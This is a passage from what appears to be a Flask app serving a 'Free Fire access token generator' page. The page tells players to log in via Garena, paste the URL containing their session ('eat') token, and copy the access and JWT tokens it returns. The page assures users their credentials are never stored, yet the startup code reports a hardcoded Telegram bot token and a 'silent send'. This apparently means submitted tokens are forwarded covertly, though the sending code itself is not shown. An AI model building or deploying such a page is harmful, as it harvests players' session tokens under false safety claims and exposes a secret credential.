                    <a href="https://auth.garena.com/universal/oauth?platform=3&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="provider-btn" title="Facebook">
                        <i class="fab fa-facebook-f" style="color:#1877f2;"></i>
                    </a>
                    <a href="https://auth.garena.com/universal/oauth?platform=10&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="provider-btn" title="Apple">
                        <i class="fab fa-apple" style="color:#fff;"></i>
                    </a>
                    <a href="https://auth.garena.com/universal/oauth?platform=11&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="provider-btn" title="X">
                        <i class="fab fa-x-twitter" style="color:#fff;"></i>
                    </a>
                    <a href="https://auth.garena.com/universal/oauth?platform=5&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/" target="_blank" class="provider-btn" title="VK">
                        <i class="fab fa-vk" style="color:#4a76a8;"></i>
                    </a>
                </div>
            </div>

            <!-- Input Card -->
            <div class="app-card">
                <div class="section-title">
                    <i class="fas fa-key"></i> Paste Eat Token
                </div>
                <div style="position:relative;">
                    <input type="text" id="tokenInp" class="cyber-input" placeholder="URL or eat token..." autocomplete="off" />
                    <button onclick="clearInput()" id="clearBtn" style="position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:none; color:#6b4a5a; cursor:pointer; display:none;">
                        <i class="fas fa-times-circle"></i>
                    </button>
                </div>
                <p style="font-size:9.5px; color:#6b4a5a; margin-top:8px;">
                    <i class="fas fa-info-circle" style="color:#ec4899;"></i> Full URL or raw token supported
                </p>
            </div>

            <!-- Generate Button -->
            <button onclick="processToken()" id="btn" class="btn-3d">
                GENERATE ACCESS <i class="fas fa-arrow-right" style="font-size:11px;"></i>
            </button>

            <!-- Output -->
            <div id="output" style="display:none; margin-top:16px;">
                <div class="app-card" style="border-color:rgba(236,72,153,0.35);">
                    <div class="section-title">
                        <i class="fas fa-check-circle" style="color:#10b981;"></i> Generated Successfully
                    </div>

                    <div class="info-grid">
                        <div class="info-item">
                            <div class="label">Nickname</div>
                            <div class="value" id="nick">-</div>
                        </div>
                        <div class="info-item">
                            <div class="label">Region</div>
                            <div class="value" id="reg">-</div>
                        </div>
                        <div class="info-item">
                            <div class="label">Account UID</div>
                            <div class="value" id="aid">-</div>
                        </div>
                    </div>

                    <!-- Access Token -->
                    <div style="margin-top:12px;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
                            <span style="font-size:9.5px; font-weight:700; color:#f472b6; text-transform:uppercase; letter-spacing:1px;">
                                <i class="fas fa-key"></i> Access Token
                            </span>
                            <button onclick="copyAccessTokenOnly()" id="copyTokenBtn" class="copy-btn">
                                <i class="fas fa-copy" style="font-size:9px;"></i> COPY
                            </button>
                        </div>
                        <div class="scroll-box-token" id="accessTokenDisplay">-</div>
                    </div>

                    <!-- JWT Token -->
                    <div id="jwtContainer" style="margin-top:12px; display:none;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
                            <span style="font-size:9.5px; font-weight:700; color:#f472b6; text-transform:uppercase; letter-spacing:1px;">
                                <i class="fas fa-shield-halved"></i> JWT Token
                            </span>
                            <button onclick="copyJwtTokenOnly()" id="copyJwtBtn" class="copy-btn">
                                <i class="fas fa-copy" style="font-size:9px;"></i> COPY
                            </button>
                        </div>
                        <div class="scroll-box" id="jwtTokenDisplay">-</div>
                    </div>

                    <!-- Full Response -->
                    <div style="margin-top:12px;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
                            <span style="font-size:9.5px; font-weight:700; color:#f472b6; text-transform:uppercase; letter-spacing:1px;">
                                <i class="fas fa-code"></i> Full Response
                            </span>
                            <button onclick="copyFullResponse()" id="copyFullResponseBtn" class="copy-btn">
                                <i class="fas fa-copy" style="font-size:9px;"></i> COPY
                            </button>
                        </div>
                        <div class="scroll-box-large" id="apiResponseDisplay">Waiting...</div>
                    </div>
                </div>
            </div>

            <!-- Error -->
            <div id="error-box" style="display:none; margin-top:14px;">
                <div class="error-box">
                    <i class="fas fa-exclamation-triangle" style="color:#ef4444; font-size:24px;"></i>
                    <h3 style="color:#f87171; font-weight:700; font-size:13px; text-transform:uppercase; letter-spacing:1px; margin-top:6px;" id="error-title">Error</h3>
                    <p style="font-size:10px; color:#a8a0b0; margin-top:3px;" id="error-message">Please try again later.</p>
                </div>
            </div>
        </section>

        <!-- ════ TAB: GUIDE ════ -->
        <section id="tab-howto" class="tab-panel">
            <div class="app-card">
                <div class="section-title">
                    <i class="fas fa-book-open"></i> How To Use
                </div>

                <div class="step">
                    <span class="step-num">1</span>
                    <div>
                        <p>Select any provider from the <strong>Home</strong> tab and login.</p>
                        <p style="font-size:10px; color:#10b981; margin-top:4px;"><i class="fas fa-shield-alt"></i> Safe — Official Garena server</p>
                    </div>
                </div>

                <div class="step">
                    <span class="step-num">2</span>
                    <div>
                        <p>After login, copy the URL containing <code>eat=</code> parameter.</p>
                        <div style="background:rgba(236,72,153,0.08); border:1px solid rgba(236,72,153,0.2); padding:8px; border-radius:8px; margin-top:8px;">
                            <p style="font-size:9px; color:#a8a0b0; margin-bottom:4px;">Example URL:</p>
                            <code style="font-size:9px; color:#fbcfe8; word-break:break-all; display:block; line-height:1.4;">https://discstore.kiosgamer.com.id/?eat=14f06...&region=IND&account_id=7669969208</code>
                        </div>
                    </div>
                </div>

                <div class="step">
                    <span class="step-num">3</span>
                    <p>Paste the URL or just the <strong>Eat Token</strong> in Home tab and tap <strong>GENERATE ACCESS</strong>.</p>
                </div>

                <div class="step">
                    <span class="step-num">4</span>
                    <p>Copy your <strong>Access Token</strong> and <strong>JWT Token</strong> using the copy buttons.</p>
                </div>
            </div>

            <div class="app-card" style="background:linear-gradient(145deg, rgba(16,185,129,0.1), rgba(5,2,8,0.6)); border-color:rgba(16,185,129,0.3);">
                <div class="section-title" style="color:#6ee7b7;">
                    <i class="fas fa-shield-alt" style="color:#10b981;"></i> Safety
                </div>
                <p style="font-size:11px; color:#a8a0b0; line-height:1.6;">
                    This tool uses official Garena servers. Your credentials are never stored on our side. All tokens are generated in real-time.
                </p>
            </div>
        </section>

        <!-- ════ TAB: LINKS ════ -->
        <section id="tab-social" class="tab-panel">
            <div class="app-card">
                <div class="section-title">
                    <i class="fas fa-share-nodes"></i> Connect With Us
                </div>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                    <a href="https://whatsapp.com/channel/0029VbEFhcW4inoja64ZCr0D" target="_blank" class="social-card">
                        <i class="fab fa-whatsapp" style="color:#25d366;"></i>
                        <span>WhatsApp</span>
                    </a>
                    <a href="https://www.youtube.com/@APEXSUJEET-07" target="_blank" class="social-card">
                        <i class="fab fa-youtube" style="color:#ff0000;"></i>
                        <span>YouTube</span>
                    </a>
                    <a href="https://www.instagram.com" target="_blank" class="social-card">
                        <i class="fab fa-instagram" style="color:#e1306c;"></i>
                        <span>Instagram</span>
                    </a>
                    <a href="https://t.me/ngsujeet" target="_blank" class="social-card">
                        <i class="fab fa-telegram" style="color:#29b6f6;"></i>
                        <span>Telegram</span>
                    </a>
                </div>
            </div>

            <div class="app-card">
                <div class="section-title">
                    <i class="fas fa-heart" style="color:#ec4899;"></i> About
                </div>
                <p style="font-size:11.5px; color:#a8a0b0; line-height:1.7;">
                    <strong style="color:#fff;">NG SUJEET TOKEN</strong> is a premium Free Fire access token generator — built for developers and educational purposes. Fast, safe, and easy to use.
                </p>
            </div>
        </section>

        <!-- ════ TAB: TERMS ════ -->
        <section id="tab-terms" class="tab-panel">
            <div class="app-card">
                <div class="section-title">
                    <i class="fas fa-file-contract"></i> Terms &amp; Conditions
                </div>
                <div style="font-size:11.5px; color:#a8a0b0; line-height:1.7; display:flex; flex-direction:column; gap:12px;">
                    <p>This website does not store any sensitive details. We only store basic data to provide quality service.</p>
                    <p style="color:#f472b6;"><strong>Disclaimer:</strong> Use this tool at your own risk. The developer is not responsible for any misuse.</p>
                    <p style="color:#f87171;">Do not use these tokens to <strong>violate Garena Terms &amp; Conditions</strong> and do not try any kind of automation.</p>
                    <p>The owner made this tool for educational purposes for developers.</p>
                    <p>By using this website, you explicitly agree to our terms and conditions.</p>
                </div>
            </div>

            <div class="app-card" style="text-align:center;">
                <i class="fas fa-crown" style="font-size:28px; color:#ec4899; margin-bottom:8px; filter:drop-shadow(0 0 12px rgba(236,72,153,0.6));"></i>
                <p style="font-size:13px; font-weight:700; color:#fff; margin-bottom:4px;">NG SUJEET PREMIUM</p>
                <p style="font-size:9px; color:#f472b6; text-transform:uppercase; letter-spacing:2px;">Version 2.0</p>
            </div>
        </section>

    </main>

    <!-- ═══ BOTTOM NAV ═══ -->
    <nav class="app-bottom-nav">
        <button class="nav-btn active" data-tab="generate" onclick="switchTab('generate', this)">
            <i class="fas fa-bolt"></i>
            <span>Home</span>
        </button>
        <button class="nav-btn" data-tab="howto" onclick="switchTab('howto', this)">
            <i class="fas fa-book"></i>
            <span>Guide</span>
        </button>
        <button class="nav-btn" data-tab="social" onclick="switchTab('social', this)">
            <i class="fas fa-share-nodes"></i>
            <span>Links</span>
        </button>
        <button class="nav-btn" data-tab="terms" onclick="switchTab('terms', this)">
            <i class="fas fa-shield-halved"></i>
            <span>Terms</span>
        </button>
    </nav>
</div>

<script>
let currentResponseData = null;
const tokenInp = document.getElementById('tokenInp');
const clearBtn = document.getElementById('clearBtn');

function switchTab(name, btn) {
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-' + name).classList.add('active');
    if (btn) btn.classList.add('active');
    document.querySelector('.app-content').scrollTop = 0;
}

tokenInp.addEventListener('input', function() {
    clearBtn.style.display = tokenInp.value.length === 0 ? 'none' : 'block';
});

function clearInput() {
    tokenInp.value = '';
    clearBtn.style.display = 'none';
    tokenInp.focus();
}

tokenInp.addEventListener("keypress", function(e) {
    if (e.key === "Enter") { e.preventDefault(); processToken(); }
});

function extractEatToken(input) {
    if (input.includes('eat=')) {
        const m = input.match(/[?&]eat=([^&]+)/);
        if (m && m[1]) return m[1];
    }
    return input;
}

function decodeNickname(encoded) {
    if (!encoded) return '-';
    try {
        const d = atob(encoded);
        if (/^[\x20-\x7E]+$/.test(d)) return d;
        return encoded;
    } catch (_) { return encoded; }
}

function copyAccessTokenOnly() {
    if (currentResponseData && currentResponseData.token_access) {
        copyToClipboard(currentResponseData.token_access, document.getElementById('copyTokenBtn'), 'COPIED!');
    } else {
        const d = document.getElementById('accessTokenDisplay');
        if (d && d.innerText !== '-' && d.innerText !== 'No token_access field in response') {
            copyToClipboard(d.innerText, document.getElementById('copyTokenBtn'), 'COPIED!');
        } else { alert('No access token available'); }
    }
}
function copyJwtTokenOnly() {
    if (currentResponseData && currentResponseData.token) {
        copyToClipboard(currentResponseData.token, document.getElementById('copyJwtBtn'), 'COPIED!');
    } else { alert('No JWT token available'); }
}
function copyFullResponse() {
    const t = document.getElementById('apiResponseDisplay').innerText;
    if (t && t !== 'Waiting...') {
        copyToClipboard(t, document.getElementById('copyFullResponseBtn'), 'COPIED!');
    } else { alert('No response data'); }
}

function copyToClipboard(text, btn, msg) {
    if (!text) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => showCopyFeedback(btn, msg))
            .catch(() => fallbackCopy(text, btn, msg));
    } else { fallbackCopy(text, btn, msg); }
}
function fallbackCopy(text, btn, msg) {
    const ta = document.createElement('textarea');
    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.select(); ta.setSelectionRange(0, 99999);
    document.execCommand('copy'); document.body.removeChild(ta);
    showCopyFeedback(btn, msg);
}
function showCopyFeedback(btn, msg) {
    const orig = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-check" style="font-size:9px;"></i> ' + msg;
    btn.classList.add('copy-btn-success');
    setTimeout(() => { btn.innerHTML = orig; btn.classList.remove('copy-btn-success'); }, 2000);
}

async function processToken() {
    const input = tokenInp.value.trim();
    const btn = document.getElementById('btn');
    const out = document.getElementById('output');
    const errBox = document.getElementById('error-box');
    const errorTitle = document.getElementById('error-title');
    const errorMessage = document.getElementById('error-message');

    out.style.display = 'none';
    errBox.style.display = 'none';
    document.getElementById('jwtContainer').style.display = 'none';
    currentResponseData = null;

    if (!input) { tokenInp.focus(); return; }

    const eatToken = extractEatToken(input);
    if (!eatToken) {
        errorTitle.innerText = 'Invalid Input';
        errorMessage.innerText = 'Provide a valid URL or eat token.';
        errBox.style.display = 'block';
        return;
    }

    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING...';
    btn.disabled = true;

    const url = '/api/generate?eat_token=' + encodeURIComponent(eatToken);

    try {
        const resp = await fetch(url, { method: 'GET', headers: { 'Accept': 'application/json' } });
        const text = await resp.text();
        let result;
        try { result = JSON.parse(text); }
        catch (e) { result = { error: 'Invalid JSON response', raw: text }; }

        currentResponseData = result;
        document.getElementById('apiResponseDisplay').innerText = JSON.stringify(result, null, 2);

        if (result.success === false || result.error) {
            errorTitle.innerText = 'Error';
            errorMessage.innerText = result.error || result.message || 'Invalid eat token or API error.';
            errBox.style.display = 'block';
            btn.innerHTML = 'GENERATE ACCESS <i class="fas fa-arrow-right" style="font-size:11px;"></i>';
            btn.disabled = false;
            return;
        }

        let nickname = '-';
        if (result.jwt_decoded && result.jwt_decoded.payload && result.jwt_decoded.payload.nickname) {
            nickname = decodeNickname(result.jwt_decoded.payload.nickname);
        } else if (result.nickname) { nickname = result.nickname; }
        document.getElementById('nick').innerText = nickname;

        let region = '-';
        if (result.region) { region = result.region; }
        else if (result.jwt_decoded && result.jwt_decoded.payload && result.jwt_decoded.payload.noti_region) {
            region = result.jwt_decoded.payload.noti_region;
        }
        document.getElementById('reg').innerText = region;

        let uid = '-';
        if (result.account_uid) { uid = result.account_uid; }
        else if (result.jwt_decoded && result.jwt_decoded.payload && result.jwt_decoded.payload.account_id) {
            uid = String(result.jwt_decoded.payload.account_id);
        } else if (result.Uid) { uid = result.Uid; }
        document.getElementById('aid').innerText = uid;

        if (result.token_access) {
            document.getElementById('accessTokenDisplay').innerText = result.token_access;
        } else {
            document.getElementById('accessTokenDisplay').innerText = 'No token_access field in response';
        }

        if (result.token) {
            document.getElementById('jwtTokenDisplay').innerText = result.token;
            document.getElementById('jwtContainer').style.display = 'block';
        }

        out.style.display = 'block';
        setTimeout(() => out.scrollIntoView({ behavior: 'smooth', block: 'start' }), 100);
    } catch (error) {
        errorTitle.innerText = 'Network Error';
        errorMessage.innerText = 'Failed to connect. Please try again.';
        errBox.style.display = 'block';
    }

    btn.innerHTML = 'GENERATE ACCESS <i class="fas fa-arrow-right" style="font-size:11px;"></i>';
    btn.disabled = false;
}
</script>
</body>
</html>
"""


@app.route('/')
def index():
    return Response(HTML_PAGE, mimetype='text/html')


if __name__ == '__main__':
    print("=" * 60)
    print("  🌸 NG SUJEET TOKEN — Premium Mobile App Style")
    print("=" * 60)
    if TELEGRAM_BOT_TOKEN == "9201813081:AAFuYGngv4kXKfmV_vqIy4SnsKECMucGLYs":
        print("  ⚠️  Telegram not configured — edit app.py to enable")
    else:
        print("  ✅ Telegram bot configured (silent send)")
    print("  🌐 Open: http://localhost:5000")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=True)